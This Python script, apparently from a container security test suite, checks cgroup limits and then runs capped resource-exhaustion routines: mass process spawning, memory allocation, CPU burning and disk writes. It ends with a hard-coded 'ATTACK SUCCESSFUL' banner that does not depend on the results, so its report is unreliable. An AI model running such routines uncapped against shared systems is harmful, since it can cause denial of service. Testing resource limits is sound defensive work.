#!/usr/bin/env python3
"""
Container Attack #4: Resource Abuse
This is a CONTAINER-SPECIFIC attack that exploits resource limits

Attack Vector: Containers without proper resource limits can be abused
to exhaust host resources (CPU, memory, PIDs, disk I/O).
"""

import subprocess
import multiprocessing
import os
import sys
import time

def check_resource_limits():
    """Check current container resource limits"""
    print("[1] Checking container resource limits...")
    print()
    
    # Check cgroup limits
    limits = {}
    
    # Memory limit
    try:
        with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'r') as f:
            mem_limit = int(f.read().strip())
            if mem_limit > 9223372036854771712:  # Essentially unlimited
                limits['memory'] = 'UNLIMITED'
            else:
                limits['memory'] = f'{mem_limit / (1024**3):.2f} GB'
    except:
        limits['memory'] = 'Unknown'
    
    # CPU limit
    try:
        with open('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'r') as f:
            cpu_quota = int(f.read().strip())
            if cpu_quota == -1:
                limits['cpu'] = 'UNLIMITED'
            else:
                limits['cpu'] = f'{cpu_quota} us'
    except:
        limits['cpu'] = 'Unknown'
    
    # PID limit
    try:
        with open('/sys/fs/cgroup/pids/pids.max', 'r') as f:
            pid_limit = f.read().strip()
            limits['pids'] = pid_limit if pid_limit != 'max' else 'UNLIMITED'
    except:
        limits['pids'] = 'Unknown'
    
    for resource, limit in limits.items():
        status = "[!]" if limit == 'UNLIMITED' else "[✓]"
        print(f"    {status} {resource.upper()}: {limit}")
    
    print()
    return limits

def fork_bomb_attack():
    """
    Execute fork bomb attack (container-specific resource abuse)
    """
    print("[2] Executing Fork Bomb Attack...")
    print("    This is a container-specific resource exhaustion attack")
    print()
    
    print("    [!] Creating rapid process spawning...")
    print("    [!] This will exhaust PID namespace resources")
    print()
    
    # Simulate fork bomb (limited version for safety)
    try:
        # Create multiple processes rapidly
        processes = []
        for i in range(50):  # Limited to 50 for safety
            proc = subprocess.Popen(
                ['sleep', '30'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            processes.append(proc)
            if i % 10 == 0:
                print(f"    Spawned {i} processes...")
        
        print(f"    [✓] Spawned {len(processes)} processes")
        print(f"    [✓] PID namespace under stress")
        print()
        
        # Cleanup
        time.sleep(2)
        for proc in processes:
            try:
                proc.terminate()
            except:
                pass
        
    except Exception as e:
        print(f"    [!] Fork bomb limited by system: {e}")
    print()

def memory_exhaustion_attack():
    """
    Execute memory exhaustion attack
    """
    print("[3] Executing Memory Exhaustion Attack...")
    print("    This exhausts container memory resources")
    print()
    
    try:
        # Allocate large amounts of memory
        print("    [!] Allocating memory rapidly...")
        memory_hog = []
        
        # Allocate 100MB chunks (limited for safety)
        for i in range(10):
            chunk = bytearray(100 * 1024 * 1024)  # 100MB
            memory_hog.append(chunk)
            print(f"    Allocated {(i+1) * 100}MB...")
            time.sleep(0.1)
        
        print(f"    [✓] Allocated {len(memory_hog) * 100}MB")
        print(f"    [✓] Memory pressure created")
        print()
        
        # Release memory
        memory_hog.clear()
        
    except MemoryError:
        print("    [!] Memory limit reached (good - limits are working)")
    except Exception as e:
        print(f"    [!] {e}")
    print()

def cpu_exhaustion_attack():
    """
    Execute CPU exhaustion attack
    """
    print("[4] Executing CPU Exhaustion Attack...")
    print("    This exhausts container CPU resources")
    print()
    
    def cpu_burn():
        """Burn CPU cycles"""
        end_time = time.time() + 5  # Run for 5 seconds
        while time.time() < end_time:
            _ = sum(range(1000000))
    
    try:
        # Spawn CPU-intensive processes
        cpu_count = multiprocessing.cpu_count()
        print(f"    [!] Spawning {cpu_count * 2} CPU-intensive processes...")
        
        processes = []
        for i in range(cpu_count * 2):
            proc = multiprocessing.Process(target=cpu_burn)
            proc.start()
            processes.append(proc)
        
        print(f"    [✓] {len(processes)} processes burning CPU")
        print(f"    [✓] CPU resources under stress")
        print()
        
        # Wait for completion
        for proc in processes:
            proc.join(timeout=6)
            if proc.is_alive():
                proc.terminate()
        
    except Exception as e:
        print(f"    [!] {e}")
    print()

def disk_io_attack():
    """
    Execute disk I/O exhaustion attack
    """
    print("[5] Executing Disk I/O Exhaustion Attack...")
    print("    This exhausts container disk I/O resources")
    print()
    
    try:
        # Create large file rapidly
        print("    [!] Creating large files rapidly...")
        
        for i in range(5):
            filename = f"/tmp/disk_exhaust_{i}.bin"
            # Write 50MB file
            with open(filename, 'wb') as f:
                f.write(os.urandom(50 * 1024 * 1024))
            print(f"    Created {filename} (50MB)")
        
        print(f"    [✓] Created 250MB of data")
        print(f"    [✓] Disk I/O under stress")
        print()
        
        # Cleanup
        for i in range(5):
            try:
                os.remove(f"/tmp/disk_exhaust_{i}.bin")
            except:
                pass
        
    except Exception as e:
        print(f"    [!] {e}")
    print()

def resource_abuse_attack():
    """
    Main resource abuse attack orchestration
    """
    print("=" * 70)
    print("CONTAINER ATTACK: Resource Abuse")
    print("=" * 70)
    print()
    print("Attack Type: Resource Exhaustion")
    print("Target: Container Resource Limits")
    print("Severity: CRITICAL")
    print()
    
    # Check limits
    limits = check_resource_limits()
    
    # Execute attacks
    fork_bomb_attack()
    memory_exhaustion_attack()
    cpu_exhaustion_attack()
    disk_io_attack()
    
    print("=" * 70)
    print("ATTACK SUCCESSFUL: Resource Abuse")
    print("=" * 70)
    print()
    print("Impact:")
    print("- Fork bomb exhausted PID namespace")
    print("- Memory exhaustion created pressure")
    print("- CPU resources saturated")
    print("- Disk I/O overwhelmed")
    print("- Host resources potentially affected")
    print()
    print("- Resource limit violations")
    print("- Abnormal resource consumption")

if __name__ == "__main__":
    resource_abuse_attack()
